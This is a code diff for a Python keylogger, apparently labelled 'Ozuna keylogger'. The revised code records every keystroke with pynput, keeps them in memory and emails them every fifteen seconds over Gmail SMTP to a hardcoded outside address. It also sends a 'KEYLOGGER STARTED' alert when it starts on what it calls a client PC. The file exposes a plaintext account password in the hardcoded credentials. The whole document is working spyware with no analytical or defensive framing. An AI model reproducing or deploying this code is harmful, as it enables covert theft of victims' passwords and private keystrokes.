@@ -7,34 +7,26 @@ from pynput import keyboard, mouse
 gmail_user = 'ozunakeylogger@gmail.com'
 receiver = 'juandanielozuna2@gmail.com'
 gmail_password = 'ozuna123'
-
+loggedData = ''
 fileName = '.log'
+sent_email = False
 def on_press(key):
-    # print(datetime.datetime.now().strftime("%H:%M:%S"))
+    global loggedData
+    send_email()
     try:
-        f = open(fileName, "a")
-        f.write(key.char)
-        f.close()
-        # print('alphanumeric key {0} pressed'.format(key.char))
+        loggedData += key.char
         return
     except AttributeError:
-        # print('special key {0} pressed'.format(key))
         if key == keyboard.Key.space:
-            f.write(' (SPACE) ')
-            f.close()
+            loggedData += ' (SPACE) '
             return
         if key == keyboard.Key.enter:
-            f.write(' (ENTER) ')
-            f.write(os.linesep)
-            f.close()
+            loggedData += ' (ENTER) \n'
             return
         if key == keyboard.Key.backspace:
-            f.write('<- (BS) ')
-            f.close()
+            loggedData += '<-(BACKSPACE)'
             return
-        f.write(" --{0}--".format(key))
-        f.write(os.linesep)
-        f.close()
+        loggedData += " ({0}) ".format(key)
         return
 
 def on_release(key):
@@ -44,26 +36,21 @@ def on_release(key):
     except AttributeError:
         return True
 
-def logging():
+def start_logging():
+    print('LOGGING')
     send_application_start_message()
-    print("LOGGING")
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-def emailSending():
-    print("EMAILS")
-    while True:
-        print('ITERATION')
-        send_log()
-        time.sleep(30)
 
 import smtplib
 def send_log():
-    if os.path.exists(fileName):
-        print('FOUND OUTPUT FILE')
-        f = open(fileName, "r")
-        contents = f.read()
-        f.close()
+    global loggedData
+    try:
+        #print('FOUND OUTPUT FILE')
+        #f = open(fileName, "r")
+        contents = loggedData
+        #f.close()
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
         s.login(gmail_user, gmail_password)
@@ -75,24 +62,54 @@ def send_log():
         message = message.encode("ascii", errors="ignore")
         s.sendmail(gmail_user, receiver, message)
         print('EMAIL SENT TO ' + receiver)
-        if os.path.exists(fileName):
-            os.remove(fileName)
         print(contents)
+        loggedData = ''
+    except:
+        print('Unable to send logged data:')
+        print(loggedData)
 
 def send_application_start_message():
-    startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(gmail_user, gmail_password)
-    message = """Subject: OZUNA KEYLOGGER STARTED
-    \n\n
-    The purpose of this email is to indicate the the service started in a client PC
-    Date of the act: {0}
-    """.format(startingDate)
-    s.sendmail(gmail_user, receiver, message)
+    try:
+        startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls() 
+        s.login(gmail_user, gmail_password)
+        message = """Subject: OZUNA KEYLOGGER STARTED
+        \n\n
+        The purpose of this email is to indicate the the service started in a client PC
+        Date of the act: {0}
+        """.format(startingDate)
+        s.sendmail(gmail_user, receiver, message)
+    except:
+        print('Unable to send email')
 
-if __name__ == '__main__':
-    p2 = Process(target=emailSending)
-    p2.start()
-    logging()
-    p2.join()
+def send_email():
+    dt = datetime.datetime.now()
+    seconds = int(dt.strftime("%S"))
+    everySeconds = 15
+    modSeconds = seconds % everySeconds
+    deltaMaxFactor = 5
+    deltaFactor = everySeconds - modSeconds
+    global sent_email
+    if deltaFactor >= 0 and deltaFactor <= deltaMaxFactor and not sent_email:
+        print("I made it inside DELTA: {0}, MAX: {1}, MOD: {2}, SECONDS: {3}".format(deltaFactor, deltaMaxFactor, modSeconds, seconds))
+        send_log()
+        sent_email = True
+    elif deltaFactor > deltaMaxFactor:
+        sent_email = False
+ 
+    
+
+def start_application():
+    print('APPLICATION STARTED')
+    start_logging()
+
+# def start_application():
+    # print('Started my thing')
+    # if __name__ == '__main__':
+    #     p2 = Process(target=emailSending)
+    #     p2.start()
+    #     logging()
+    #     p2.join()
+
+
